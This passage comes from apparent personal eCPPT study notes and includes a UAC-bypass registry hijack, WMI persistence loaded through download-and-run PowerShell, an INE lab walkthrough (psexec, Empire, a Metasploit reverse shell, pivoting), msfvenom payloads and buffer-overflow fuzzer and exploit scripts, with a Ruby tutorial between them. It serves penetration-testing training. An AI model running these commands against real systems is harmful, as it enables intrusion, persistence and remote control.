dccw.exe\n\n\n# Process Monitor Filters\nProcess Name.  &gt; is       &gt; mmc.exe\nProcess Name   &gt; is       &gt; compmgmtlauncher.exe\nResult         &gt; is       &gt; NAME NOT FOUND\nPATH           &gt; contains &gt; msc\n\n\n# Search path on Process Monitor and modify regedit value of this to \"C:\\windows\\system32\\cmd.exe\"\n\nHKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n\n\n\n# Windows Runs\nRUN &gt; compmgmtlauncher.exe\n</code></pre></p> <p>Introduction to Leveraging WMI and Methods for Persistence <pre><code># Get Information About WMI instances, Classes and related information\nPS &gt; Get-WmiObject\nPS &gt; Get-Help Get-WmiObject\nPS &gt; Get-Help wmi\n\n# List all Namespaces within the root/cimv2 namespace along its namespaces classes\nPS &gt; Get-WmiObject -Namespace root/cimv2 -Class \"__NameSpace\"\nPS &gt; Get-WmiObject -Namespace root/cimv2 -Class \"__NameSpace\" | Select-Object -Property Name\n\nPS &gt; Get-WmiObject -Namespace root/cimv2 -List\nPS &gt; Get-WmiObject -Namespace root/cimv2 -List | ? {$_.Name -Match \"win32_service\"}\n\n# Get a specific service - win32_service\nPS &gt; Get-WmiObject -Class win32_service\nPS &gt; Get-WmiObject -Class win32_service | ? {$_.State -Match \"Running\"}\nPS &gt; Get-WmiObject -Class win32_service | ? {$_.Name -Match \"Defend\"}\n\n# Get a specific service - win32_process\nPS &gt; Get-WmiObject -Class win32_process\nPS &gt; Get-WmiObject -Class win32_process -List\n\n\n# Get Available methods of specifit Class\nPS &gt; Get-WmiObject -Class win32_process -List | Get-Member -MemberType Method\nPS &gt; Get-WmiObject -Class win32_service -List | Get-Member -MemberType Method\n\n\n\n# Create Process - CMD.exe\nPS &gt; $proc = Get-WmiObject -List win32_process\nPS &gt; $proc.Create(\"cmd.exe\")\n\nPS &gt; \u00a0Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList cmd.exe\n\n\n# Launching Processes on Remote Computers\nPS &gt; Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList cmd.exe -ComputerName 192.168.100.8 -Credential gibarbakadze\n\n# Check that Process is running on Remote Computer\nPS &gt; Get-WmiOnject -Class win32_process  -Filter (ProcessID= \"&lt;ProcessID&gt;\") -ComputerName 192.168.100.8 -Credential gibarbakadze\n\n# Kill Process on Remote Computer\nPS &gt; Get-WmiOnject -Class win32_process  -Filter (ProcessID= \"&lt;ProcessID&gt;\") -ComputerName 192.168.100.8 -Credential gibarbakadze | Remove-WmiObject \n</code></pre></p> <p>WMI - PowerLunk - Persistence <pre><code># https://github.com/Sw4mpf0x/PowerLurk\n\n# Write the notepad.exe process ID to C:\\temp\\log.txt whenever notepad.exe starts. Also Possible to run MSFVenom Payload \n\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1\"); Register-MaliciousWmiEvent -EventName LogNotepad -PermanentCommand \u201ccmd.exe /c echo %ProcessId% &gt;&gt; c:\\\\temp\\\\log.txt\u201d -Trigger ProcessStart -ProcessName notepad.exe\n\n\n\n# View Our Malicious WMI event\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1\"); Get-WmiEvent -Name LogNotepad\n\n\n\n# Remove Our Malicious WMI event\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1\"); Get-WmiEvent -Name LogNotepad | Remove-WmiObject\n</code></pre></p> <p>LAB -  Leveraging PowerShell During Exploitation <pre><code># Scan Host\nnmap -sS -sV -p- demo.ine.local\n\n# Port 4983 is opened. Open with Firefox to View Administrator Credentials\n\n# Impacket-Psexec \n$ Impacket-Psexec Administrator:'abc_123321!@#'@demo.ine.local\n$ whoami\n\n\n# Run Empire\n$ powershell-empire server\n$ powershell-empire client\n\n\n# Empire Setup Listener\n$ ./Empire/setup/cert.sh                  # Generate SSL keys\n(Empire) &gt; uselistener http\n(Empire: listener/http) &gt; set Host 10.10.10.15\n(Empire: listener/http) &gt; set Port 443\n(Empire: listener/http) &gt; set CertPath &lt;Directory where SSL keys are&gt;\n(Empire: listener/http) &gt; execute\n(Empire: listener/http) &gt; main\n\n\n# Empire Setup Stager\n(Empire) &gt; usestager multi/launcher\n(Empire: usestager/multi/launcher) &gt; set Listener http\n(Empire: usestager/multi/launcher) &gt; execute\n\n\n# Copy and paste the Empire-generated PowerShell code, to Impacket-Psexec\n\n# Empire Agents - Bounch of various interesting modules\n\n(Empire) &gt; agents\n(Empire: agents) &gt; interact &lt;agent&gt;\n(Empire: agents) &gt; help\n\n(Empire: Interact) &gt; usemodule powershell/situational_awareness/network/port_scan\n\n(Empire: Interact) &gt; usemodule powershell/situational_awareness/host/computerdetails\n\n(Empire: Interact) &gt; usemodule powershell/privesc/powerup/allchecks\n\n\n\n# Transfer our existing Empire Agent over to Metasploit\nmsf &gt; use exploit/multi/script/web_delivery\nmsf &gt; set target 2\nmsf &gt; set SRVHOST 10.10.10.15\nmsf &gt; set LHOST 10.10.10.15\nmsf &gt; set Payload windows/meterpreter/reverse_tcp\nmsf &gt; exploit\n\n(Empire: Interact) &gt; usemodule powershell/code_execution/invoke_metasploitpayload\n(Empire: Interact) &gt; set URL &lt;Metasploit Generated URL&gt;\n(Empire: Interact) &gt; execute\n\n\n# Pivoting over Metasploit\nMeterpreter &gt; run autoroute -s &lt;IP&gt; -n &lt;Subnet&gt;\nMeterpreter &gt; backgrund\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; set srvversion 4a\nmsf &gt; set srvport 9050\nmsf &gt; execute\nmsf &gt; jobs\n\n$ proxychains nmap -sT -Pn -n --top-ports 50 fileserver.ine.local\n$ proxychains firefox &gt; http://fileserver.ine.local\n\n# Exoloit port 80 on fileserver.ine.local\nmsf &gt; exploit/windows/http/badblue_passthru\nmsf &gt; set PAYLOAD windows/meterpreter/bind_tcp\nmsf &gt; set RHOSTS fileserver.ine.local\nmsf &gt; exploit\nmeterpterer &gt; getsystem\nmeterpreter &gt; cat C:\\flag.txt\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/","title":"Ruby & Metasploit","text":""},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#installation-fundamentals","title":"Installation / Fundamentals","text":"<pre><code># Installation\n$ sudo apt-get install &lt;ruby_version&gt;        # Linux\n$ brew install ruby                          # MacOS\n\n# https://www.ruby-lang.org/en/documentation/ruby-from-other-languages/\n\n-----------------------------------------------------------------------------\n\n$ ruby hello.rb             # Ruby from a File\n$ ruby -e \" puts 'Hello\"    # Ruby from Command Line\n$ irb                       # Interactive Ruby\n\n#!/usr/bin/ruby             # shebang\n\n-----------------------------------------------------------------------------\n\n# Ruby One-Liners\n$ ruby -ep 0 file.txt                            # Display content of file\n$ ruby -ne 'END {print \"Lines:\",$.,\"\\n\"}' file   # Display Number of Lines\n$ ruby -i -pe 'gsub \"foo\",\"FOO\"' file            # Change foo to FOO\n\n\n------------------------------------------------------------------------------\n\n# Librarys\n$ gem list                 # Local Librarys\n$ gem install [Library]    # Install Library\n$ gem install pry          # Install pry library\n\n-------------------------------------------------------------------------------\n</code></pre> <p>Interegers</p> <pre><code>puts 2+2\nputs 3.+3\nputs 4.4+5\n\nputs 4.odd?\nputs 4.even?\nputs 4.next\nputs 4.pred\n\nputs 25.to_s\nputs 65.chr\n</code></pre> <p>Strings</p> <pre><code># Quotes\nputs %[Hello \"World\"]\nputs %Q[Hello \"World\"]\nputs %q[Hello \"World\"]\n\n\n# Info about strings\nst = \"myString\"\nst.empty?\nst.frozen?\nst.clear\nst.lenght\nst.size\nst.start_with? \"my\"\nst.end_with? \"ing\"\n\n\n\n# Heredoc\nst = &lt;&lt;END \nand it Heredoc\nScript and\nawesome\nEND\nputs st\n\n\n\n# String Arithmetics\nst = \"MyString is Perl\"\nst &lt;&lt; \"NotMyString\"\nst * 5\nst[Perl] = \"Ruby\"\nst[0] = \"m\"\nst[0..5] = \"MyAbs\"\nst[0..5] = \"M\"\n\n\nst.sub(\"Perl\",\"Ruby\")\nst.gsub(\"Perl\",\"Ruby\")\nst.sub!(\"Perl\",\"Ruby\")\nst.gsub!(\"Perl\",\"Ruby\")\n\nst.insert(0,\"m\")\nst.insert(-2,\"M\")\nst.insert(st.size,\"World\")\n\n\n\n# Interpolation\nputs \"My name is #{Ruby Code}\"\nputs %[My name is #{Ruby Code}]\n\n\n# Some Useful Method\nst = \"Mystring\"\nst.upcase\nst.downcase\nst.capitalize\nst.reverse\nst.chop\n</code></pre> <p>Arrays</p> <pre><code># Create Array\narr = Array.new(10)\narr = Array.new(10, \"HelloWorld\")\narr = Array.new(10, 0)\n\narr2 = Array[\"Hello\", \"World\"]\narr2 = Array[]\narr2 = []\narr2 &lt;&lt; 1 &lt;&lt; 2 &lt;&lt; 3 &lt;&lt; 4 &lt;&lt; 5\n\n# Array Class/Format\nputs arr.class\nputs arr[0].class\nputs arr[1].class\n\n# Multi Array\narr = [1, [\"Hello\", 137], 2 , 3]\narr = [1, [2, [\"Hello\", 137], 3], 4]\n\n\n# Variables in Arrays - If Var is changed, Arr is changed and vice verca\nvar = \"Mystring\"\narr = [1, var]\n\n\n# Insertion\narr = [1,3,4,5]\narr.insert(1,2)                        # Prints 1 2 3 4 5\narr.insert(1,2,11,22,33)               # Prints 1 2 11 22 33 3 4 5\narr &lt;&lt; 6                               # Append\narr[1..3] = [\"two\", \"three\", \"four\"]\n\n\n# Deletion\narr = [1,\"Hello\",3,4,5]\narr.delete_at(0)               # Delete index 0\narr.delete(\"Hello\")            # Delete \"Hello\"\narr.delete(1)                  # Detele 1\n\n\n# Operations between arrays\narr1 = [1,2,3]\narr2 = [2,3,4]\narr3 = [5,6,7]\nall = arr1 + arr2 + arr3\nall = arr1 | arr2                    # No Dublicates\nall = arr1 &amp; arr2                    # Common Elements\nall = arr1 - arr2                    # Difference\n\n\n\n# Stack\narr = [1,\"Hello\",2,3,4]\narr.push(5)\narr.pop\n\n\n# Useful Methods\narr.sort\narr.reverse\narr.uniq\narr.sort!                         # Change Original Object\narr.reverse!                      # Change Original Object\narr.uniq!                         # Change Original Object\n\n\n# Arrays and Strings\narr = [\"Hello\", \"World\", \"!\"]\narr.join(\" \")                     # Prints Hello World !\n\nst = \"Hello World !\"\nst.split(\" \")                     # Prints [\"Hello\", \"World\", \"!\"]\n</code></pre> <p>Ranges and Hash <pre><code># Ranges\n(2..9).to_a                   # Array from 2 to 9\n(2...9).to_a                  # Array from 2 to 8\n(\"a\"..\"z\").to_a               # Array from a to z\n\narr = (\"a\"..\"z\").to_a         # Arr Variable with array from a to z\narr = (\"Hi a\"..\"Hi b\").to_a   # Arr Variable with array from Hi a to Hi z\n\n(2..9).begin\n(2..9).min\n(2..9).max\n(2..9).end\n(2..9).include?(4)\n(2..9) === 4\n(\"a\"..\"z\").include?(\"c\")\n\n\n\n# Hashes / Dictionaries\nhash = {}\nhash[\"a\"] = \"Hello\"\nhash[\"b\"] = \"World\"\n\nhash = {\"a\" =&gt; \"Hello\", \"b\" =&gt; \"World\"}\nhash = {fname:\"Hello\", lname:\"World\"}\nhash = {\":fname\" =&gt; \"Hello\", \":lname\" =&gt; \"World\"}\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#control-structures","title":"Control Structures","text":"<p>Comparison</p> <pre><code>a &lt;=&gt; b\n    0 if a == b\n    1 if a &gt; b\n    -1 if a &lt; b\n</code></pre> <p>Conditionals</p> <pre><code>if x &gt; 0 then\n    puts \"Done\"\nelsif x &lt; 10 then\n    puts \"Undone\"\nelse\n    puts \"Other\"\nend\n\n\nif x &gt; 0 \n    puts \"Done\"\nend\n\n\n\n# Single line Conditions\n\nif x &gt; 0 then puts \"Done\" end\n\nputs \"\\n Done\" if a.is_a? Integer\nputs \"\\n Done\" if a &gt; 0\n\n\n# Case\n\nx = 5\ncase x\n    when 1 then print \"one\"\n    when 2 then print \"two\"\n    when 3 then print \"three\"\n    else print \" idk\"\nend\n\n\n\n# Ternary Operator\n\ntest_expr ? True_expr : false_expr\n\nname == \"Someone\" ? \"Hi Someone\" : \"Who are you ?\"\n</code></pre> <p>Loops </p> <pre><code># While\ni = 0\nwhile i &lt; 5 do                    # With/Without \"do\"\n    puts i\n    i += 1\nend\n\n\nwhile i &lt; 5 do puts i+=1 end\nputs i+=1 while i&lt;5\narr.pop while !arr.empty?\n\n\n# Until\ni = 5\nuntil i == 0 do                   # With/Without \"do\"\n    puts i\n    i -= 1\nend\n\n\nuntil i == 0 do puts i-=1 end\nputs i-=1 until i ==0\n\n\n\n# For\nfor i in [2,5,10] do\n    puts i\nend\n\n\nfor i in 1..10 do\n    puts i\nend\n\n\n# Times\n\nn = 5\nn.times\n    puts \"Hello World !\"\nend\n</code></pre> <p>Iterators &amp; Enumerators</p> <pre><code># Iterators\n\narr.each do |i|\n    puts i\nend\n\n\narr.each { |i| puts i }\n\n(1..10).each { |i| puts i }\n(\"a\"..\"z\").each { |c| puts c }\n\n\n4.upto(20) { |n| puts n }\n5.downto(-2) { |n| puts n }\n\n\n\n# Enumerable Objects\n\narr = [1,2,5,8,11]\n\narr.map! do |i|                               # Change Elements of arr\n    i*i\nend\n\n\nnums = arr.select do |i|                      # Prints 2,8\n    i%2 == 0 \nend\n\n\nnums = arr.reject do |i|                      # Prints 1,5,8,11\n    i%2 == 0\nend\n\n\nnums = arr.inject { |sum, x| sum+x }          # Sums array elements\n\n\n\n# External Enumerators\n\narr = [1,2,5,8,11]\n\nenum = arr.to_enum\nenum.next                          # Prints 2\nenum.next                          # Prints 5\n</code></pre> <p>Altering Structured Control Flow</p> <pre><code># Break\n\nfor i in (1..10)\n    print i, \"\\s\"\n    break if i==5\nend\n\n\n(1..10).each do |i|\n    puts i \n    break if i == 5\nend\n\n\n# Next\n\nfor i in (1..10)\n    next if i == 5\n    print i, \"\\s\"\nend\n\n\n(1..10).each do |i|\n    next if i == 5\n    puts i, \"\\s\"\nend\n</code></pre> <p>BEGIN / END</p> <pre><code>BEGIN {\n puts \"\\n\",\"Beginning code\",\"\\n\"\n}\n\nEND{\n puts \"Ending code\",\"\\n\"\n}\n\nputs \"Normal control flow\",\"\\n\"\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#methods-variables-and-scope","title":"Methods, Variables, and Scope","text":"<p>Methods <pre><code># Methods\n\ndef test(x)\n    return x*2\nend\n\n\n# Alias\n\ndef my_long_name(X)\n    return x\nend\n\nalias f my_long_name\n\n\n\n# Parameter Default Values\n\ndef test(name = \"Someone\")\n    return x\nend\n\n\n# Array as Parameter\n\ndef test(x , *arr)\n    return x\n    return arr\nend\n\n\n# Hashes as Argument\n\ndef test(hash)\n    return hash[:name]\nend\n\ntest({:name=&gt;\"Someone\"})\n</code></pre></p> <p>Variables</p> <pre><code>puts\n# prints the name of the script\nputs \"Script name:\\t\\t#{$0}\"\n\n# prints the command line arguments\nputs \"arguments:\\t\\t#{$*}\"\n\n# reads a line and prints it\nprint \"Write something:\\t\"\n$stdin.gets\nprint \"gets:\\t\\t\\t\",$_\nputs\n\n\n# Constant A-Z\n\nA = 100\nA = 200                               # Error Arised\n\nA = 100\nmodule B\n    A = 200\nend\n\nputs A\nputs B::A\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#classes-modules-and-exceptions","title":"Classes, Modules, and Exceptions","text":""},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#classes-principles","title":"Classes Principles","text":"<p>Clasess</p> <pre><code>class MyClass\n    def func\n        return True\n    end\n\nend\n\nmyobj = MyClass.new\nmyobj.func\n</code></pre> <p>Instance Variables</p> <pre><code>class MyClass\n    @a = 1000\n    def func\n        return @a\n    end\n\nend\n\nmyobj = MyClass.new\nmyobj.func                        # Prints nothing, @a is Myclass Instance\n\n\nclass MyClass\n    def func1\n        @a = 1000\n    end\n    def func2\n        puts @a                 \n    end\nend\n\nmyobj = MyClass.new\nmyobj.func2                      # Prints 1000, Because @a is in same instance\n</code></pre> <p>Getter/Setter <pre><code># Get/Set\n\nclass MyClass\n    attr_accessor :x,:y\n\nend\n\nmyobj = MyClass.new\nmyobj.x = 100\nmyobj.y = 200\nputs myobj.x, myobj.y\n\n\n\n# Get\n\nclass MyClass\n    attr_reader :x,:y\n\nend\n\nmyobj = MyClass.new(100,200)\nputs myobj.x, myobj.y\n</code></pre></p> <p>Class Methods <pre><code>class MyClass\n    def self.func\n        puts \"Hello World !\"\n    end\nend\n\n\nputs Myclass.func\n</code></pre></p> <p>initialize methods <pre><code>class MyClass\n    attr_accessor :x,:y\n\n    def initialize(x,y)\n        @x = x\n        @y = y\n    end\n\n    def sum\n        puts @x + @y\n    end\n\nend\n\nobj = MyClass.new(10,20)\nobj.sum\n</code></pre></p> <p>Open Classes <pre><code>class String\n    def dsize\n        self.size *2\n    end\nend\n\nputs \"Hello\".dsize\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#method-visibility","title":"Method Visibility","text":"<p>Private Methods <pre><code>class MyClass\n    def func\n        return func\n    end\n\n    private\n\n    def privatefunc\n        puts \"Private Func\"\n    end\nend\n</code></pre></p> <pre><code>class MyClass\n    def func\n        return func\n    end\n\n    def privatefunc\n        puts \"Private Func\"\n    end\n\n    private:privatefunc\n\nend\n</code></pre> <pre><code>class MyClass\n    def self.func\n        return func\n    end\n\n    def self.privatefunc\n        puts \"Private Func\"\n    end\n\n    private_class_method:privatefunc\n\nend\n</code></pre> <p>Protected Methods</p> <pre><code># Protected Methods work as private but protected method may be called by any instances of the defining class or its subclasses\n\nclass MyClass\n    def func\n        return func\n    end\n\n    protected       \n\n    def privatefunc\n        puts \"Private Func\"\n    end\nend\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#subclassing-inheritance","title":"Subclassing &amp; Inheritance","text":"<pre><code>class MyClass\n    attr_accessor :name\n\n    def initialize(name)\n        @name = name\n    end\n\n    def to_s\n        \"i am #{name}\"\n    end\nend\n\n\nclass RootClass &lt; MyClass\nobj = RootClass.new(\"Someone\")\nobj.to_s\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#modules","title":"Modules","text":"<p>Modules</p> <pre><code>module MyMath\n    PI = 3.14\n    E = 2.72\n\n    def self.calc(x)\n        return E**x\n    end\n\n    def self.calc2(x)\n        return PI**x\n    end\n\n\nend\n\nputs MyMath.calc(5)\nputs MyMath.calc2(5)\n</code></pre> <p>Mixin</p> <pre><code>module B\n    def hello\n        return \"Hello\"\n    end\nend\n\nclass A\n    include B\n    def world\n        return \"World\"\n    end\nend\n\nobj = A.new\nputs obj.hello, \" \", obj.world\n</code></pre> <pre><code>include Math\nputs PI\nputs E\nputs sqrt(25)\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#exception","title":"Exception","text":"<pre><code>def my_method(a,b,c)\n    # normal flow\nrescue\n    # exception handling\nelse\n    # no exception occur\nensure\n    # alwys executed\n</code></pre> <pre><code>begin\n    # normal flow\nrescue\n    # exception handling\nelse\n    # no exception occur\nensure\n    # alwys executed\n</code></pre> <p>Exception <pre><code>begin\n    print 1/0\nrescue\n    print(\"Error Occourd\")\nend\n</code></pre></p> <p>Retry <pre><code>begin\n    print 1/0\nrescue\n    print(\"Error Occourd\")\n    retry\nend\n</code></pre></p> <p>Ensure <pre><code>begin\n    print 1/0\nrescue\n    print(\"Error Occourd\")\nensure\n    puts(\"Alwys Executed\")\nend\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#pentesters-prerequisites","title":"Pentesters Prerequisites","text":""},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#regex","title":"Regex","text":"<pre><code>st = \"Mystring is a stringA\"\nst =~ /Mystring/              # Regex Match\nst =~ %r(Mystring)            # Regex Match\nst =~ /Mystring/i             # Case Insensitive Match\n\n\n/Mystring/.match(st)          # Regex Match\n/mystring/i.matchst)         # Regex Match\n\nmatching = /Mystring/.match(st)           # Regex Match\nmatching = /Mystring/i.match(st)          # Regex Match\nmatching[0]\n\nst\" =~ /\\(/              # Regex Match find (\nst\" =~ /\\)/              # Regex Match find )\nst =~ /\\|/               # Regex Match find |\n\n\nst =~ /[0-9]/            # digit\nst =~ /[\\d]/             # digit\nst =~ /[\\D]/             # no digit\nst =~ /[\\w]/             # word\nst =~ /[\\W]/             # no word\nst =~ /[\\s]/             # space\nst =~ /[\\S]/             # no space\n\n\n\"Code: 4B\" =~ /\\d[A-Z]/               # prints 6, match 4B\n\nst =~ /strex|string/i                 # Alternatives\nst =~ /strin(g|n)/                    # alternatives\n\nst =~ /string{2}/                     # Occurance twice\nst =~ /^Mystring/                     # Start with \"Mystring\"\nst =~ /string$/                       # end with \"string\"\n\n\nip = /\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/.match(\"This is my ip 192.168.10.1\")  # Regex IP\nip[0]                                                                       # get IP\n</code></pre> <p>Global Variables <pre><code>string = \"This is my ip 192.168.10.1\"\nstring =~ /\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/\n$~                                          # matchdata object\n$&amp;                                          # prints searched string (192.168.10.1)\n$1                                          # prints word after space\n$2                                          # so on...\n$~.to_s                                     # to string\n</code></pre></p> <p>Working with Strings <pre><code>text = \"abcd 192.168.10.1 this is my ip 192.168.20.110\"\npattern = /\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/\n\ntext.scan(pattern) { |x| puts x}                 # prints all ip\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#time","title":"Time","text":"<p>Time <pre><code>Time.now                    # Current time\nTime.now.utc                # Currnet time in UTC\n\nt = Time.local(2014,1,13,11,50)         # Set new time\nt.year\nt.month\nt.day\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#files-and-directories","title":"Files and Directories","text":"<p>Directories <pre><code>Dir.pwd                  # Current directory\nDir.getwd                # Current directory\nDir.home(\"user\")         # Home directory of user\n\n# Change Directory\nDir.chdir(\"/tmp\")\nDir.chdir(\"..\")\n\nDir.chdir(\"/tmp\") do\n    puts Dir.pwd\n    Code Here\nend\n\n\n# Create/Delete Directory\nDir.mkdir(\"test\")                  # Create\nDir.unlink(\"test\")                 # Delete\n\n\n# Directory Listing\nDir.entries(\".\")\nDir[\"*.rb]\n\nDir.foreach(\".\") do |file|\n    puts file\nend\n\n\n# Existence\nDir.exist? \"/tmp\"\n</code></pre></p> <p>Real World - Check if Application Exist <pre><code>#!/usr/bin/ruby\n\ndirectories = [\n'C:\\\\Program FIles\\\\',\n'C:\\\\Program FIles (x86)\\\\',\n'C:\\\\'\n]\n\ninstalled = false\n\nfor dir in directories do\n  dir = dir + ARGV[0]\n  if Dir.exist? dir\n    installed = true\n    puts %Q! Exist : #{dir}!\n    puts \"\\nListing\"\n    Dir.foreach(\".\") { |x| puts x }\n  end\nend\n</code></pre></p> <p>Files</p> <pre><code>File.exist? \"example.txt\"            # Existence\nFile.size? \"example.txt\"             # Size\nFile.file? \"example.txt\"             # Check file\nFile.directory? \"exampledir\"         # Check Directory\nFile.ftype \"example.txt\"            # Prints file type\n\nFile.readable? \"exmaple.txt\"         # Check readable permission\nFile.writable? \"example.txt\"         # Check writable permission\nFile.executable? \"example.txt\"       # Check executable permission\n\nFile.mtime \"example.txt\"             # Check last modification time\nFile.atime \"example.txt\"             # Check last access time\nFile.ctime \"example.txt\"             # Creation time\n\nst = File.stat \"example.txt\"\nst.size\nst.mtime\nst.ctime\n</code></pre> <p>Names</p> <pre><code>path = \"/home/user/flag.txt\"\n\nFile.basename path                    # return flag.txt\nFile.basename(path, \".txt\")           # return flag\n\nFile.dirname path                     # return /home/user\nFile.extname path                 # return .txt\nFile.split path                       # return [\"/home/user/\",\"flag.txt\"]\nFile.expand_path(\"~Desktop\")          # return /home/user/Desktop\n</code></pre> <p>Creation/Deletion/Renaming</p> <pre><code>File.open(\"newfile.txt\",\"w\")          # Create file\nFile.new(\"newfile.txt\",\"w\")           # Create file\n\nFile.rename(\"file.txt\",\"renamedfile.txt\")          # rename file\n\nFile.delete(\"file.txt\")          # Delete file\nFile.unlink(\"file.txt\")          # Delete file\n\nFile.chmod(0777, \"file.txt\")          # Change permission file\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#input-output","title":"Input Output","text":"<p>File Stream</p> <p>Read file <pre><code># Open and Read file\nFile.open(\"example.txt\" ,\"r\") do | file|\n    contents = file.read\n    puts contents\nend\n\n\n\n# Read Without Open\ncontent = File.read(\"example.txt\") \nputs content\n\n\n# As Array\ncontent = File.readlines(\"example.txt\") \nputs content[0]\n</code></pre></p> <p>Write File <pre><code># Create/Write File\nFile.open(\"example.txt\", \"w\") do |line|\n    line.puts(\"hacked\")\nend\n\n\nFile.open(\"example.txt\", \"w\") do |line|\n    line.write(\"hacked\")\nend\n\n\n# Append/Write file\nFile.open(\"example.txt\", \"a\") do |line|\n    line.puts(\"hacked\")\nend\n\n\nFile.open(\"example.txt\", \"a\") do |line|\n    line.write(\"hacked\")\nend\n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/","title":"System Security","text":""},{"location":"eCPPT%20Materials/System%20Security/#pattern-createoffset","title":"Pattern Create/Offset","text":"<p>Pattern Create/Offset github</p> <p>Usage:</p> <p><pre><code>$ ./pattern create 2048\n</code></pre> <pre><code>$ ./pattern offset 0x67433966\n</code></pre></p> <p>Metasploit <pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb\n</code></pre></p> <p>Mona Plugin</p> <p>Usage : <pre><code>!mona pc 2048\n</code></pre> <pre><code>!mona po 0x67433966\n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/#mona-commands","title":"Mona Commands","text":"<p>Installation : Copy <code>mona.py</code> file into PyCommand folder inside Imunity Debugger installation folder.</p> <p>Then set working folder for Mona : <pre><code>!mona config -set workingfolder C:\\ImmunityLogs\\%p\n</code></pre></p> <p>Once application crashes and EIP is overwriten, run following command to provide Metasploit Module for exploiting the application :</p> <pre><code>!mona suggest\n</code></pre> <p>List of avalable modules used by application : <pre><code>!mona modules\n</code></pre></p> <p>List of modules, which have not ASLR enabled : <pre><code>!mona noaslr\n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/#finding-bad-characters","title":"Finding Bad Characters","text":"<pre><code>#!/usr/bin/env python\nfrom __future__ import print_function\n\nfor x in range(1, 256):\n    print(\"\\\\x\" + \"{:02x}\".format(x), end='')\n\nprint()\n</code></pre> <p>Generate bytearray.bin <pre><code>!mona bytearray -b \"\\x00\"\n</code></pre></p> <p>Compare <pre><code>!mona compare -f C:\\mona\\oscp\\bytearray.bin -a &lt;ESP_address&gt;\n</code></pre></p> <p>[!NOTE] Remember that badchars can affect the next byte as well!</p>"},{"location":"eCPPT%20Materials/System%20Security/#call-esp-jmp-esp","title":"CALL ESP / JMP ESP","text":"<p>findjmp2 </p> <p>usage : <pre><code>.\\findjmp.exe kernel32.exe esp\n</code></pre></p> <p>Mona Plugin Documentation</p> <p>Usage : <pre><code>!mona jmp -r esp -m kernel\n</code></pre> <pre><code>!mona jmp -r esp -m kernel32.dll\n</code></pre> <pre><code>!mona jmp -r esp -cpb \"\\x00\"\n</code></pre></p> <p>[!Note]  In order to correctly write this address, we will have to write it in little-endian.</p>"},{"location":"eCPPT%20Materials/System%20Security/#msfvenom","title":"MSFVenom","text":"<p>Payload : <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=4444 -f c  -b \"\\x00\\x0A\\x0D\" \n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/#exploits","title":"Exploits","text":"<p>Fuzzer <pre><code>#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"10.10.33.182\"\n\nport = 1337\ntimeout = 5\nprefix = \"OVERFLOW1 \"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string, \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n</code></pre></p> <p>Exploit <pre><code>#!/usr/bin/env python3\nimport socket\n\nip = \"10.10.33.182\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 0\noverflow = \"A\" * offset\nretn = \"\"\npadding = \"\"\npayload = \"\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/","title":"WIFI Security","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#environment-setup","title":"Environment Setup","text":"<pre><code># Check if system is using mac80211 drivers\n$ lsmod | grep mac80211\n\n\n# Details about wireless device\n$ iwconfig\n$ iw list\n\n\n# Change WiFi channel\n$ iwconfig wlan0 channel 11\n$ iw dev wlan0 